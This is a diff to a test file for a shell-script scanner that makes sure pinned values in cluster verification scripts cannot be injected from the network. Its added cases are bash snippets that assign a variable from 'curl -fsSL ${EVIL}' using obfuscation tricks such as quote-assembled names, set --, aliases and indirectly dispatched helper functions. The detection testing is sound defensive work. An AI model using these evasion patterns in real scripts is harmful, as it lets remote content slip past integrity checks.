@@ -815,6 +815,12 @@ describe('kind-cluster cert-manager/Knative/Calico manifests are checksum + imag
     "mapfile -d ';'": `mapfile -d ';' STATIC_LSN < <(curl -fsSL ${EVIL})`,
     '${V:=…} inside an unquoted heredoc': `cat >/dev/null <<EOF\n\${STATIC_LSN:=$(curl -fsSL ${EVIL})}\nEOF`,
     'a write in a sourced file that cannot be read': '. /tmp/not-in-the-tree.sh',
+    'a name assembled from quotes (printf -v V"AR")': `printf -v STATIC_LS"N" %s "$(curl -fsSL ${EVIL})"`,
+    "a name assembled from $'…'": `read -r STATIC_$'LSN' < <(curl -fsSL ${EVIL})`,
+    'a name assembled from a backslash': `read -r STATIC_LS\\N < <(curl -fsSL ${EVIL})`,
+    'positional parameters rewritten by set': `set -- "$(curl -fsSL ${EVIL})"; STATIC_LSN="$1"`,
+    'a helper that assigns from $1, never called statically': 'setlsn() { STATIC_LSN="$1"; }',
+    'a helper that assigns from $1, dispatched through a variable': `setlsn() { STATIC_LSN="$1"; }; h=setlsn; "$h" "$(curl -fsSL ${EVIL})"`,
     'an alias for read': `shopt -s expand_aliases; alias rd=read; rd -r STATIC_LSN < <(curl -fsSL ${EVIL})`,
     'printf -v': `printf -v STATIC_LSN "%s" "$(curl -fsSL ${EVIL})"`,
     'printf -vNAME (attached)': `printf -vSTATIC_LSN "%s" "$(curl -fsSL ${EVIL})"`,
@@ -872,6 +878,22 @@ describe('kind-cluster cert-manager/Knative/Calico manifests are checksum + imag
     });
   }
 
+  it('round 9: a helper that assigns from $1 is traced through its call site, even one AFTER the statement', () => {
+    const file = `${D}_verify-objstore.sh`;
+    const text = readTracked(file).replace(
+      R9_OBJSTORE_ANCHOR,
+      () => `${R9_OBJSTORE_ANCHOR}setlsn() { STATIC_LSN="$1"; }\n`,
+    );
+    const offenders = scanFile(file, `${text}\nsetlsn "$(curl -fsSL ${EVIL})"\n`);
+    expect(
+      offenders.some(
+        (o) =>
+          o.includes("allowlisted statement 'lsn-inject-objstore'") &&
+          o.includes(`fetch:curl -fsSL ${EVIL}`),
+      ),
+    ).toBe(true);
+  });
+
   it('round 9: `for V in $(curl …)` on the lsn-inject-restore entry reds its source pin', () => {
     const line = `for STATIC_LSN in $(curl -fsSL ${EVIL}); do :; done`;
     expect(r9Inject(`${D}_verify-restore.sh`, R9_RESTORE_ANCHOR, line, 'lsn-inject-restore')).toBe(
@@ -923,6 +945,8 @@ describe('kind-cluster cert-manager/Knative/Calico manifests are checksum + imag
         [`${label} $REPLY`]: `${STRICT}read -r < <(${producer})\nV="$REPLY"\n${apply}\n`,
         [`${label} printf -v "$n"`]: `${STRICT}n=V\nprintf -v "$n" "%s" "$(${producer})"\n${apply}\n`,
         [`${label} heredoc \${V:=}`]: `${STRICT}cat >/dev/null <<EOF\n\${V:=$(${producer})}\nEOF\n${apply}\n`,
+        [`${label} set --`]: `${STRICT}set -- "$(${producer})"\nV="$1"\n${apply}\n`,
+        [`${label} assembled name`]: `${STRICT}printf -v "V""" "%s" "$(${producer})"\n${apply}\n`,
         [`${label} $(<file)`]: `${STRICT}${producer} > /tmp/f\nV="$(</tmp/f)"\n${apply}\n`,
       });
     }
